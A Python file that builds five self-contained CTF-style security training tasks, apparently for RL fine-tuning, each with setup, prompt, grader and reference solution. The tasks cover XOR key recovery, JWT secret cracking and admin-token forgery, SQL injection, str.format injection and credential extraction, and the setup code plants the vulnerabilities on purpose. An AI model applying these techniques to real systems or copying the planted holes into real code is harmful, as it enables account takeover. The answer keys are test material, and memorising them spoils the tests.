#!/usr/bin/env python3
"""Deeper security exercises for gh0stx RFT. Self-contained CTF-style tasks (local
fixtures only, no third-party targets), each gradeable and self-tested here
(setup -> reference_solution -> grader must print PASS). stdlib-only, so selftest runs
on any box or the mac. --emit appends PASS tasks to authored_tasks.json."""
import json, os, sys, subprocess, tempfile, shutil

TASKS = [
{
 "id": "sec_repeated_key_xor",
 "category": "reverse-or-decode",
 "behavior": "break repeating-key XOR using a known-plaintext crib, recover the key, decrypt",
 "setup_sh": r'''#!/usr/bin/env bash
set -e
python3 - "$W/cipher.b64" <<'PY'
import sys,base64
pt=b"passphrase=orbital-decay-9931; note=rotate weekly"
key=b"K3y!"
ct=bytes(pt[i]^key[i%len(key)] for i in range(len(pt)))
open(sys.argv[1],"w").write(base64.b64encode(ct).decode())
PY
''',
 "prompt": "cipher.b64 is base64 of ASCII plaintext XOR-ed with a short repeating multi-byte key. The plaintext begins with the crib 'passphrase='. Recover the key, decrypt, and write only the passphrase value (the text after 'passphrase=' up to the ';') to RESULT.txt.",
 "grader_sh": r'''#!/usr/bin/env bash
[ -f "$W/RESULT.txt" ] || { echo "FAIL(no result)"; exit 0; }
exp=$(python3 - "$W/cipher.b64" <<'PY'
import sys,base64
ct=base64.b64decode(open(sys.argv[1]).read().strip())
crib=b"passphrase="
stream=bytes(ct[i]^crib[i] for i in range(len(crib)))
p=next(p for p in range(1,len(crib)+1) if all(stream[i]==stream[i%p] for i in range(len(crib))))
key=stream[:p]
pt=bytes(ct[i]^key[i%p] for i in range(len(ct))).decode('latin1')
print(pt.split('passphrase=',1)[1].split(';',1)[0])
PY
)
got=$(tr -d '\n\r' < "$W/RESULT.txt")
[ "$got" = "$exp" ] && echo PASS || echo "FAIL(exp=$exp got=$got)"
''',
 "reference_solution_sh": r'''#!/usr/bin/env bash
python3 - "$W/cipher.b64" "$W/RESULT.txt" <<'PY'
import sys,base64
ct=base64.b64decode(open(sys.argv[1]).read().strip())
crib=b"passphrase="
stream=bytes(ct[i]^crib[i] for i in range(len(crib)))
p=next(p for p in range(1,len(crib)+1) if all(stream[i]==stream[i%p] for i in range(len(crib))))
key=stream[:p]
pt=bytes(ct[i]^key[i%p] for i in range(len(ct))).decode('latin1')
open(sys.argv[2],"w").write(pt.split('passphrase=',1)[1].split(';',1)[0])
PY
''',
 "notes": "crib recovers key stream; detect period; decrypt",
},
{
 "id": "sec_jwt_weak_secret",
 "category": "reverse-or-decode",
 "behavior": "crack a weak HS256 JWT secret from a wordlist, then forge a privileged token",
 "setup_sh": r'''#!/usr/bin/env bash
set -e
python3 - "$W" <<'PY'
import sys,os,hmac,hashlib,base64,json
W=sys.argv[1]
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
secret=b"hunter2"
hdr={"alg":"HS256","typ":"JWT"}; pl={"user":"bob","role":"user"}
sh=b64u(json.dumps(hdr,separators=(",",":")).encode())
sp=b64u(json.dumps(pl,separators=(",",":")).encode())
sig=b64u(hmac.new(secret,f"{sh}.{sp}".encode(),hashlib.sha256).digest())
open(W+"/token.txt","w").write(f"{sh}.{sp}.{sig}")
open(W+"/wordlist.txt","w").write("\n".join(["password","letmein","qwerty","hunter2","dragon","admin123"]))
PY
''',
 "prompt": "token.txt holds an HS256 JWT with role=user. wordlist.txt lists candidate signing secrets. Crack the secret (the wordlist entry whose HMAC-SHA256 reproduces the token's signature), then forge a new token: same header, payload with role changed to admin, signed with that secret. Write the forged token (header.payload.signature, base64url, no padding) to RESULT.txt.",
 "grader_sh": r'''#!/usr/bin/env bash
[ -f "$W/RESULT.txt" ] || { echo "FAIL(no result)"; exit 0; }
python3 - "$W/RESULT.txt" <<'PY'
import sys,hmac,hashlib,base64,json
secret=b"hunter2"
def ub64(s): return base64.urlsafe_b64decode(s+"="*(-len(s)%4))
tok=open(sys.argv[1]).read().strip()
try:
    h,p,s=tok.split(".")
    exp=base64.urlsafe_b64encode(hmac.new(secret,f"{h}.{p}".encode(),hashlib.sha256).digest()).rstrip(b"=").decode()
    ok_sig = (s==exp)
    role=json.loads(ub64(p)).get("role")
    print("PASS" if ok_sig and role=="admin" else "FAIL(sig=%s role=%s)"%(ok_sig,role))
except Exception as e:
    print("FAIL(%s)"%e)
PY
''',
 "reference_solution_sh": r'''#!/usr/bin/env bash
python3 - "$W" <<'PY'
import sys,hmac,hashlib,base64,json
W=sys.argv[1]
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def ub64(s): return base64.urlsafe_b64decode(s+"="*(-len(s)%4))
tok=open(W+"/token.txt").read().strip(); h,p,s=tok.split(".")
secret=None
for w in open(W+"/wordlist.txt").read().split():
    if b64u(hmac.new(w.encode(),f"{h}.{p}".encode(),hashlib.sha256).digest())==s:
        secret=w.encode(); break
pl=json.loads(ub64(p)); pl["role"]="admin"
np=b64u(json.dumps(pl,separators=(",",":")).encode())
nsig=b64u(hmac.new(secret,f"{h}.{np}".encode(),hashlib.sha256).digest())
open(W+"/RESULT.txt","w").write(f"{h}.{np}.{nsig}")
PY
''',
 "notes": "HS256 secret in wordlist (hunter2); forge admin token",
},
{
 "id": "sec_web_sqli_sqlite",
 "category": "wire-and-run",
 "behavior": "exploit SQL injection in a concatenated query to authenticate as another account",
 "setup_sh": r'''#!/usr/bin/env bash
set -e
python3 - "$W" <<'PY'
import sys,sqlite3,os
W=sys.argv[1]
db=W+"/app.db"; c=sqlite3.connect(db)
c.execute("CREATE TABLE users(user TEXT, pass TEXT, token TEXT)")
c.executemany("INSERT INTO users VALUES(?,?,?)",[
 ("bob","bobpw","tok-bob-001"),
 ("admin","S3cr3t-unguessable-"+os.urandom(4).hex(),"FLAG-admin-"+os.urandom(4).hex())])
c.commit(); c.close()
open(W+"/app.py","w").write(
"import sys,sqlite3,os\n"
"u=sys.argv[1]; p=sys.argv[2] if len(sys.argv)>2 else ''\n"
"c=sqlite3.connect(os.path.join(os.path.dirname(__file__),'app.db'))\n"
"q=\"SELECT token FROM users WHERE user='\"+u+\"' AND pass='\"+p+\"'\"\n"
"row=c.execute(q).fetchone()\n"
"print('token='+row[0]) if row else print('login failed')\n")
PY
''',
 "prompt": "app.py logs in with: python3 app.py <user> <password> and prints token=<value> for the matched account. It builds the SQL query by string concatenation and is injectable. Log in as admin without the password by injecting, and write only the admin account's token value (the text after token=) to RESULT.txt.",
 "grader_sh": r'''#!/usr/bin/env bash
[ -f "$W/RESULT.txt" ] || { echo "FAIL(no result)"; exit 0; }
exp=$(python3 - "$W/app.db" <<'PY'
import sys,sqlite3
c=sqlite3.connect(sys.argv[1]); print(c.execute("SELECT token FROM users WHERE user='admin'").fetchone()[0])
PY
)
got=$(tr -d '\n\r' < "$W/RESULT.txt")
[ "$got" = "$exp" ] && echo PASS || echo "FAIL(exp=$exp got=$got)"
''',
 "reference_solution_sh": r'''#!/usr/bin/env bash
out=$(python3 "$W/app.py" "admin'--" "x" 2>/dev/null)
echo "${out#token=}" > "$W/RESULT.txt"
''',
 "notes": "injection admin'-- comments out the password check",
},
{
 "id": "sec_format_string_ssti",
 "category": "reverse-or-decode",
 "behavior": "exploit a Python str.format template injection to leak a value from the format context",
 "setup_sh": r'''#!/usr/bin/env bash
set -e
python3 - "$W" <<'PY'
import sys,os
W=sys.argv[1]
flag="FLAG-ssti-"+os.urandom(4).hex()
open(W+"/flag.txt","w").write(flag)  # grader reads expected from here
open(W+"/render.py","w").write(
"import sys\n"
"flag=open(__file__.replace('render.py','flag.txt')).read().strip()\n"
"name=sys.argv[1]\n"
"# vulnerable: user input is used as the format string, flag is in the kwargs\n"
"print(('Dear {name}, balance is {bal}. '+name).format(name='guest', bal=100, flag=flag))\n")
PY
''',
 "prompt": "render.py builds output with python3 render.py <name> and passes the argument through str.format, which also has a secret 'flag' in its keyword arguments. Craft the argument to leak the flag via format-field access, run it, and write only the leaked flag (the token starting with FLAG-) to RESULT.txt.",
 "grader_sh": r'''#!/usr/bin/env bash
[ -f "$W/RESULT.txt" ] || { echo "FAIL(no result)"; exit 0; }
exp=$(cat "$W/flag.txt")
got=$(tr -d '\n\r' < "$W/RESULT.txt")
[ "$got" = "$exp" ] && echo PASS || echo "FAIL(exp=$exp got=$got)"
''',
 "reference_solution_sh": r'''#!/usr/bin/env bash
out=$(python3 "$W/render.py" "{flag}" 2>/dev/null)
echo "$out" | grep -oE 'FLAG-[A-Za-z0-9-]+' | head -1 > "$W/RESULT.txt"
''',
 "notes": "name='{flag}' leaks the flag kwarg via str.format",
},
{
 "id": "sec_traffic_basic_auth",
 "category": "parse-messy-input",
 "behavior": "carve an HTTP Basic auth credential out of a captured traffic dump and decode it",
 "setup_sh": r'''#!/usr/bin/env bash
set -e
python3 - "$W" <<'PY'
import sys,os,base64
W=sys.argv[1]
pw="Pa55w0rd-"+os.urandom(3).hex()
cred=base64.b64encode(("svc_deploy:"+pw).encode()).decode()
dump="\n".join([
 "GET /health HTTP/1.1","Host: app.internal","User-Agent: kube-probe","",
 "POST /api/login HTTP/1.1","Host: app.internal",
 "Authorization: Basic "+cred,
 "Content-Type: application/json","",'{"action":"deploy"}',
 "GET /metrics HTTP/1.1","Host: app.internal",""])
open(W+"/http_dump.txt","w").write(dump)
open(W+"/.pw","w").write(pw)
PY
''',
 "prompt": "http_dump.txt is a captured HTTP traffic dump. One request carries an HTTP Basic Authorization header. Find it, base64-decode the credential, and write only the password (the part after the colon) to RESULT.txt.",
 "grader_sh": r'''#!/usr/bin/env bash
[ -f "$W/RESULT.txt" ] || { echo "FAIL(no result)"; exit 0; }
exp=$(cat "$W/.pw")
got=$(tr -d '\n\r' < "$W/RESULT.txt")
[ "$got" = "$exp" ] && echo PASS || echo "FAIL(exp=$exp got=$got)"
''',
 "reference_solution_sh": r'''#!/usr/bin/env bash
python3 - "$W/http_dump.txt" "$W/RESULT.txt" <<'PY'
import sys,re,base64
t=open(sys.argv[1]).read()
b=re.search(r"Authorization:\s*Basic\s+(\S+)",t).group(1)
open(sys.argv[2],"w").write(base64.b64decode(b).decode().split(":",1)[1])
PY
''',
 "notes": "grep Authorization: Basic, b64decode, split on colon",
},
]

def run(script, W):
    env=dict(os.environ); env["W"]=W
    p=subprocess.run(["bash","-c",script], env=env, capture_output=True, text=True, timeout=120)
    return p.stdout, p.stderr, p.returncode

def selftest():
    ok=[]
    for t in TASKS:
        W=tempfile.mkdtemp(prefix="stest2_")
        try:
            run(t["setup_sh"], W); run(t["reference_solution_sh"], W)
            out,err,rc=run(t["grader_sh"], W)
            v=out.strip().splitlines()[-1] if out.strip() else "(no output)"
            p=v.startswith("PASS"); ok.append(t["id"]) if p else None
            print(f"{'PASS' if p else 'FAIL'}  {t['id']:26s} {'' if p else v}")
            if not p and err.strip(): print("      stderr:", err.strip()[:200])
        finally:
            shutil.rmtree(W, ignore_errors=True)
    print(f"\n{len(ok)}/{len(TASKS)} passed: {ok}")
    return ok

def emit(passed_ids, path):
    d=json.load(open(path)); existing={x["id"] for x in d["tasks"]}; added=[]
    for t in TASKS:
        if t["id"] in passed_ids and t["id"] not in existing:
            tt=dict(t); tt["self_test_passed"]=True; d["tasks"].append(tt); added.append(t["id"])
    json.dump(d, open(path,"w"), ensure_ascii=False, indent=1)
    print("appended:", added, "| total tasks now:", len(d["tasks"]))

if __name__=="__main__":
    if len(sys.argv)>1 and sys.argv[1]=="--emit":
        emit(selftest(), sys.argv[2] if len(sys.argv)>2 else "authored_tasks.json")
    else:
        selftest()
